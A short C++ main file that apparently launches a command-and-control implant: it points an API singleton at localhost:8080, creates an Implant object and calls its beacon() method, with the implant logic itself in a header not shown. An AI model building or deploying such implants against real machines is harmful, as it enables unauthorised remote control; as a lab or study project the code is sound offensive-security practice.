#include <iostream>
#include <boost/system/system_error.hpp>
#include "implant.hpp"

int main(int argc, char* argv[]){
    const auto host = "localhost";
    const auto port = "8080";

    // Setup the API Singleton
    Api::setup(host, port);

    std::unique_ptr implant = std::make_unique<Implant>();

    try {
        implant->beacon();
    }
    catch (const boost::system::system_error& se) {
        std::cout << "\nSystem error:" << se.what() << std::endl;
    }

    return 0;
}